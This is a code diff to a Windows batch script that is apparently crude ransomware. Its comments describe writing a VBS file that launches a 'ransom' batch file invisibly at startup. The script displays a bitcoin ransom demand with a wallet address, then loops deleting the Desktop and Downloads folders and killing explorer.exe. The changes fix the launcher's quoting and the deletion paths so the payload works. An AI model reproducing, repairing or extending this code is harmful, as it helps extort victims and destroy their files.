@@ -38,7 +38,7 @@ set web="C:\users\%username%\%web1%"
 ::Create A File To Start The Ransom Bash File At The Start Up, Invisibly::
 
 echo Set WshShell = CreateObject("WScript.Shell") >> ka.vbs
-echo WshShell.run chr(34) ^& "%appdata%\ka.bat" %%% Chr(34), 0 >> ka.vbs
+echo WshShell.run chr(34) ^& "%appdata%\ka.bat" ^& Chr(34), 0 >> ka.vbs
 echo Set WshShell = Nothing >> ka.vbs
 
 ::Fake Bash File Checking::
@@ -183,8 +183,8 @@ echo msg * To get back your normall shit... send 0,0031 bitcoin to: 13h4EMjcusGE
 echo ping localhost -n 4 >> ka.bat
 echo msg RIP >> ka.bat
 echo :lol >> ka.bat
-echo rmdir "%currentuser%\Desktop" >> ka.bat
-echo rmdir "%currentuser%\Downloads" >> ka.bat
+echo rmdir "C:\users\%username%\Desktop" >> ka.bat
+echo rmdir "C:\users\%username%\Downloads" >> ka.bat
 echo taskkill explorer.exe >> ka.bat
 echo goto lol >> ka.bat
 
